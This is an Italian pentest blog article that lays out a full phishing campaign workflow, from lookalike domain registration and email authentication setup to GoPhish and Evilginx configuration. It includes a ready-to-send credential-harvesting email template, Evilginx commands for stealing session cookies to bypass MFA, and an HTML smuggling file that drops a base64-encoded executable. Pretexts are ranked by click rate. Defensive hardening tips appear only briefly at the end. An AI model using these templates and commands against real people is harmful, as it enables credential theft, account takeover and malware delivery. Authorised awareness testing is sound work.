---
title: 'Phishing: Tecniche, Tipologie e Difese nel 2026'
slug: phishing
description: >-
  Phishing spiegato in modo tecnico: spear phishing, credential harvesting,
  OAuth phishing, MFA bypass e difese pratiche per aziende e utenti.
image: '/ChatGPT Image Feb 22, 2026, 04_17_05 PM.webp'
draft: false
date: 2026-02-27T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - social-engineering
  - phishing
---

# Phishing: Infrastruttura, Tool, Payload e Campagne Operative

> **Executive Summary** — Il phishing è il vettore di initial access più usato nel mondo reale — oltre l'80% dei breach inizia con un'email. Nel pentest, la campagna di phishing testa la resilienza umana dell'organizzazione: quanti utenti cliccano un link, quanti inseriscono credenziali, quanti aprono un allegato malevolo. Ma una campagna di phishing efficace richiede molto più del "mandare un'email con un link": serve un'infrastruttura credibile (dominio, certificato TLS, SPF/DKIM/DMARC), template convincenti, payload che evadono i filtri email e una landing page che cattura credenziali o esegue codice. Questo articolo copre l'intero workflow — dalla preparazione del dominio alla post-exploitation.

**TL;DR**

* L'infrastruttura è il 70% del successo: dominio simile al target, SPF/DKIM configurati, certificato TLS, IP reputation pulita
* GoPhish per gestire la campagna (invio, tracking, metriche), Evilginx per il credential harvesting con bypass MFA
* Il pretext (la storia) è più importante del tool — email credibile > link perfetto

```

## Perché il Phishing nel Pentest

Il phishing nel pentest serve a due obiettivi distinti:

1. **Assessment della consapevolezza** (awareness test): misuri quanti utenti cadono — il risultato è una metrica per il cliente
2. **Initial access** (red team): ottieni credenziali valide o esecuzione di codice per entrare nella rete — il phishing è solo il primo step della kill chain

L'approccio è diverso: nell'awareness test mandi a 500 utenti e misuri le percentuali. Nel red team mandi a 5 utenti selezionati (spear phishing) e ti basta che uno cada.

## 1. Preparazione dell'Infrastruttura

L'infrastruttura è la base. Un'email phishing da un dominio con cattiva reputazione, senza SPF e senza DKIM, finisce in spam. L'infrastruttura richiede preparazione — idealmente settimane prima della campagna.

### Dominio

```

Obiettivo: dominio simile al target per ingannare l'utente

Tecniche di somiglianza:

* Typosquatting: corp-local.com (invece di corp.local)
* Homoglyph: córp.local (accento), corp1ocal.com (1 al posto di l)
* TLD swap: corp.net, corp.io, corp.cloud
* Subdomain: corp.local.attacker.com
* Keyword: corp-security.com, corp-helpdesk.com, corp-update.com

Tool per trovare domini disponibili:

* dnstwist: genera varianti e verifica disponibilità
* urlcrazy: simile, più varianti

````

```bash
# dnstwist — genera varianti del dominio target
dnstwist --registered corp.local
````

**Output:**

```
*original    corp.local
addition     corp-local.com     A:1.2.3.4 (registrato!)
bitsquatting corplocal.com      - (disponibile)
homoglyph    córp.local         - (disponibile)
hyphenation  c-orp.local        - (disponibile)
insertion    corpp.local        - (disponibile)
omission     corp.locl          - (disponibile)
```

```bash
# Registra il dominio scelto
# Usa un registrar che non richiede verifica immediata
# Aspetta almeno 1-2 settimane per "invecchiare" il dominio (age reputation)
```

### DNS e Email Authentication

```bash
# SPF — autorizza il tuo server a inviare email per il dominio
# Record TXT su corp-security.com:
"v=spf1 ip4:YOUR_SERVER_IP ~all"

# DKIM — firma digitale sulle email
# Genera chiave DKIM:
opendkim-genkey -s mail -d corp-security.com
# Aggiungi il record TXT: mail._domainkey.corp-security.com

# DMARC — policy di allineamento
# Record TXT: _dmarc.corp-security.com
"v=DMARC1; p=none"
```

**Perché è importante:** senza SPF/DKIM/DMARC, i server email del target (Office 365, Google Workspace) segnalano l'email come sospetta o la mettono in spam. Con SPF+DKIM configurati correttamente, l'email appare legittima.

### Server di invio

```bash
# Opzione 1: VPS con Postfix
apt install postfix opendkim opendkim-tools
# Configura Postfix + OpenDKIM

# Opzione 2: Servizio SMTP (SendGrid, Mailgun)
# Pro: reputazione IP già buona
# Contro: possono bloccare campagne phishing

# Opzione 3: Office 365 / Google Workspace con il tuo dominio
# Pro: massima deliverability
# Contro: costo, possono bloccare contenuti sospetti
```

### Certificato TLS per la landing page

```bash
# Let's Encrypt (gratuito)
certbot certonly --standalone -d phish.corp-security.com
```

### Checklist infrastruttura

```
□ Dominio registrato (1-2 settimane di età)
□ SPF record configurato
□ DKIM configurato e funzionante
□ DMARC configurato
□ Certificato TLS sulla landing page
□ Reverse DNS (PTR) configurato sul server
□ IP non in blacklist (check: mxtoolbox.com)
□ Test email: manda a un tuo account e verifica che non vada in spam
```

## 2. Tool — GoPhish, Evilginx e Oltre

### [GoPhish](https://hackita.it/articoli/gophish) — Gestione campagna

GoPhish è il framework standard per campagne di phishing. Gestisce: creazione template email, landing page, invio, tracking (chi apre, chi clicca, chi inserisce credenziali), metriche e report.

```bash
# Installazione
wget https://github.com/gophish/gophish/releases/latest/download/gophish-linux-64bit.zip
unzip gophish-linux-64bit.zip
chmod +x gophish
./gophish
# Dashboard: https://localhost:3333
# Credenziali iniziali nei log di avvio
```

**Configurazione GoPhish:**

```
1. Sending Profile: configura il server SMTP (Postfix, SendGrid, etc)
   - Host: smtp.corp-security.com:587
   - Username/Password
   - From: it-support@corp-security.com

2. Landing Page: la pagina dove l'utente atterra dopo il click
   - Import da URL: clona la pagina di login del target
   - Capture Credentials: abilita cattura username/password
   - Redirect: dopo il submit, redirige alla pagina vera del target

3. Email Template: il corpo dell'email
   - HTML con tracking pixel ({{.Tracker}})
   - Link alla landing page ({{.URL}})
   - Personalizzazione: {{.FirstName}}, {{.LastName}}, {{.Email}}

4. Users & Groups: importa la lista di target (CSV)

5. Campaign: combina tutto e programma l'invio
```

**Template email efficace:**

```html
Subject: [Azione richiesta] Aggiornamento password aziendale

<p>Gentile {{.FirstName}},</p>

<p>Il team IT ha implementato un aggiornamento di sicurezza che richiede 
la verifica delle credenziali di accesso entro 48 ore.</p>

<p>Per completare la verifica, accedi al portale di aggiornamento:</p>

<p><a href="{{.URL}}">Verifica le tue credenziali</a></p>

<p>Se non completi la verifica entro il termine, il tuo account 
verrà temporaneamente sospeso.</p>

<p>Cordiali saluti,<br>
Supporto IT<br>
Corp Security Team</p>

{{.Tracker}}
```

### [Evilginx](https://hackita.it/articoli/evilginx) — Bypass MFA con Reverse Proxy

Evilginx è un reverse proxy che si posiziona tra la vittima e il sito legittimo. Cattura non solo le credenziali ma anche il **session cookie** — bypassando MFA (2FA, OTP, FIDO in certi scenari).

```bash
# Installazione
go install github.com/kgretzky/evilginx2@latest

# Configurazione
evilginx2 -p ./phishlets

# Nella shell Evilginx:
config domain corp-security.com
config ip YOUR_SERVER_IP

# Carica un phishlet (template per un sito specifico)
phishlets hostname office365 phish.corp-security.com
phishlets enable office365

# Crea un lure (link da inviare)
lures create office365
lures get-url 0
# Output: https://phish.corp-security.com/abc123
```

**Come funziona:**

```
1. Vittima clicca il link → arriva su Evilginx (tuo server)
2. Evilginx mostra la pagina di login REALE di Office 365 (proxy)
3. Vittima inserisce username e password → Evilginx cattura
4. Vittima completa MFA (OTP, push) → il token arriva a Evilginx
5. Evilginx cattura il SESSION COOKIE → bypass MFA completo
6. Tu usi il cookie per accedere all'account senza re-autenticarti
```

```bash
# Nella shell Evilginx, dopo che la vittima si autentica:
sessions
sessions 1

# Output:
# Username: j.smith@corp.local
# Password: Summer2026!
# Cookies: [session cookies completi]
# Token: eyJ...  (JWT se presente)
```

**Cosa fai dopo:** importa il session cookie nel browser (con Cookie Editor o via DevTools) e sei autenticato come la vittima — senza bisogno di password o MFA. Per la [post-exploitation con le credenziali AD](https://hackita.it/articoli/dcsync), testa le stesse credenziali su VPN, SMB e altri servizi interni.

### Confronto tool

| Tool             | Tipo               | MFA Bypass | Complessità | Uso                                |
| ---------------- | ------------------ | ---------- | ----------- | ---------------------------------- |
| **GoPhish**      | Campaign manager   | No         | Bassa       | Awareness test, credential harvest |
| **Evilginx**     | Reverse proxy      | Sì         | Media       | Red team, bypass MFA               |
| **Modlishka**    | Reverse proxy      | Sì         | Media       | Alternativa a Evilginx             |
| **SocialFish**   | Credential harvest | No         | Bassa       | Quick credential page              |
| **King Phisher** | Campaign manager   | No         | Media       | Alternativa a GoPhish              |
| **SET**          | Toolkit            | No         | Bassa       | Quick attacks, clone sites         |

## 3. Tipologie di Phishing

### Credential Harvesting (il più comune)

L'email contiene un link a una landing page che imita il portale di login del target. L'utente inserisce le credenziali → le catturi.

**Target pages più efficaci:** Office 365 login, Google Workspace, VPN aziendale, portale HR/payroll, portale IT helpdesk.

### Payload Delivery (allegato o download)

L'email contiene un allegato malevolo o un link a un file da scaricare. L'obiettivo è l'esecuzione di codice sulla workstation dell'utente.

**Payload comuni:**

| Payload        | Formato        | Evasion                                      |
| -------------- | -------------- | -------------------------------------------- |
| Macro Office   | .docm, .xlsm   | Richiede "Enable Content"                    |
| HTA            | .hta           | Eseguito da mshta.exe                        |
| ISO/IMG        | .iso, .img     | Bypassava Mark-of-the-Web (pre-2023)         |
| OneNote        | .one           | Allegato embedded (patchato 2023)            |
| LNK            | .lnk (in .zip) | Shortcut che esegue PowerShell               |
| HTML Smuggling | .html          | JavaScript decodifica il payload nel browser |

**HTML Smuggling — il più efficace nel 2025-2026:**

```html
<!-- Allegato .html che "smuggla" un file .exe -->
<html>
<script>
var payload = "TVqQ...";  // Base64 del .exe
var bytes = atob(payload);
var array = new Uint8Array(bytes.length);
for (var i = 0; i < bytes.length; i++) array[i] = bytes.charCodeAt(i);
var blob = new Blob([array], {type: "application/octet-stream"});
var link = document.createElement("a");
link.href = URL.createObjectURL(blob);
link.download = "Report_Q4_2025.exe";
link.click();
</script>
<body>Downloading report...</body>
</html>
```

**Lettura:** l'utente riceve un .html come allegato. Lo apre nel browser. Il JavaScript decodifica il payload base64 e triggera il download di un .exe. Bypassa molti filtri email perché il .html in sé non è malevolo — il payload è codificato.

### QR Code Phishing (Quishing)

```
L'email contiene un QR code invece di un link cliccabile.
Il QR code punta alla landing page phishing.
Perché funziona: i filtri email non analizzano le immagini QR.
L'utente scansiona con il telefono → atterra sulla pagina di phishing.
```

## 4. Pretext — La Storia che Fa Funzionare Tutto

Il pretext è la narrativa dell'email — la ragione per cui l'utente dovrebbe cliccare. Un pretext debole rende inutile anche la migliore infrastruttura.

### Pretext più efficaci (dati da campagne reali)

| Pretext                               | Click rate tipico | Perché funziona              |
| ------------------------------------- | ----------------- | ---------------------------- |
| Password in scadenza                  | 30-40%            | Urgenza + familiare          |
| Documento condiviso (OneDrive/GDrive) | 25-35%            | Comune in ambiente aziendale |
| Pacco in consegna / fattura           | 20-30%            | Universale                   |
| Aggiornamento policy HR               | 20-30%            | Rilevante per tutti          |
| IT security alert                     | 15-25%            | Credibile, urgente           |
| Bonus/payroll update                  | 25-40%            | Interesse economico          |
| Invito a riunione Teams/Zoom          | 15-25%            | Quotidiano                   |
| Messaggio vocale perso                | 10-20%            | Curiosità                    |

### Principi di un buon pretext

```
1. URGENZA: "entro 24 ore", "azione immediata richiesta"
2. AUTORITÀ: da IT, HR, management, fornitore noto
3. FAMILIARITÀ: usa il formato reale delle email del target (scoprilo in OSINT)
4. RILEVANZA: collegato al lavoro dell'utente (non generico)
5. CONSEGUENZA: "il tuo account verrà bloccato", "non riceverai il prossimo stipendio"
```

### OSINT per personalizzare il pretext

```bash
# LinkedIn: ruoli, nomi manager, struttura team
# Email formato: prova j.smith@, john.smith@, jsmith@ con hunter.io o phonebook.cz
# Sito web: notizie aziendali, eventi, partnership (usali nel pretext)
# Documenti pubblici: cerca con Google dork il formato email nelle mail interne
```

Per le tecniche OSINT complete, la [Google Hacking Database su Exploit-DB](https://hackita.it/articoli/exploit-db) ha centinaia di dork utili per il pre-phishing recon.

## 5. Metriche e Reporting

### Cosa misurare

| Metrica                   | Significato                                               |
| ------------------------- | --------------------------------------------------------- |
| **Email Sent**            | Totale email inviate                                      |
| **Email Opened**          | Chi ha aperto l'email (tracking pixel)                    |
| **Link Clicked**          | Chi ha cliccato il link                                   |
| **Credentials Submitted** | Chi ha inserito le credenziali                            |
| **Payload Executed**      | Chi ha eseguito l'allegato                                |
| **Reported**              | Chi ha segnalato l'email come phishing (metrica positiva) |

### Calcolo

```
Open rate:      aperture / inviate × 100
Click rate:     click / inviate × 100
Submit rate:    submit / inviate × 100
Report rate:    segnalazioni / inviate × 100

Esempio:
500 inviate → 350 aperte (70%) → 120 click (24%) → 45 submit (9%) → 8 reported (1.6%)
```

### Benchmark di settore

```
Click rate medio: 15-25% (primo tentativo su organizzazione mai testata)
Click rate dopo training: 5-10%
Submit rate medio: 5-15%
Report rate target: >20% (buona security awareness)
```

## 6. Cheat Sheet Finale

### Infrastruttura

| Azione              | Tool/Comando                                  |
| ------------------- | --------------------------------------------- |
| Domain recon        | `dnstwist --registered target.com`            |
| SPF                 | TXT record: `v=spf1 ip4:IP ~all`              |
| DKIM                | `opendkim-genkey -s mail -d domain.com`       |
| TLS cert            | `certbot certonly --standalone -d domain.com` |
| Test deliverability | `mail-tester.com` (invia email di test)       |

### Tool

| Azione           | Tool                         |
| ---------------- | ---------------------------- |
| Campaign manager | GoPhish                      |
| MFA bypass proxy | Evilginx, Modlishka          |
| Quick clone      | SET `setoolkit → 1 → 2 → 3`  |
| QR generation    | Python qrcode library        |
| Payload          | HTML Smuggling, macro Office |

### Workflow

```
1. OSINT sul target (formato email, nomi, ruoli)
2. Registra dominio (aspetta 1-2 settimane)
3. Configura infrastruttura (SPF/DKIM/DMARC/TLS)
4. Crea template email + landing page
5. Importa target list
6. Testa su te stesso
7. Lancia campagna
8. Monitora metriche in tempo reale
9. Report con raccomandazioni
```

### Hardening (raccomandazioni per il cliente)

* Security awareness training regolare
* Simulazioni phishing trimestrali
* MFA resistente al phishing (FIDO2/WebAuthn — Evilginx non lo bypassa)
* Filtri email avanzati (sandbox allegati, URL rewriting)
* Segnalazione phishing facile (pulsante in Outlook)
* DMARC enforcement (p=reject)

***

Riferimento:

* MITRE ATT\&CK T1566 → [https://attack.mitre.org/techniques/T1566/](https://attack.mitre.org/techniques/T1566/)
* GoPhish documentation → [https://getgophish.com/documentation/](https://getgophish.com/documentation/)
* Evilginx documentation → [https://github.com/kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)

⚠️ **Disclaimer**
Le informazioni presenti in questo articolo sono fornite esclusivamente per scopi educativi e per attività di sicurezza informatica in ambienti autorizzati. Qualsiasi uso non autorizzato è illegale e non è responsabilità dell’autore.

***

🎯 **Vuoi migliorare davvero?**
Se vuoi fare il salto di livello con un percorso pratico e diretto → formazione **1:1 personalizzata**.

🏢 **Se hai un’azienda**
Puoi testare la sicurezza reale della tua infrastruttura con simulazioni controllate e assessment professionali.

💻 **Vai qui:**
👉 [https://hackita.it/servizi](https://hackita.it/servizi)

***

❤️ **Supporta il progetto HackIta**
Se questi contenuti ti aiutano, puoi supportare il progetto per mantenerlo attivo e sempre aggiornato.

👉 [https://hackita.it/supporto](https://hackita.it/supporto)
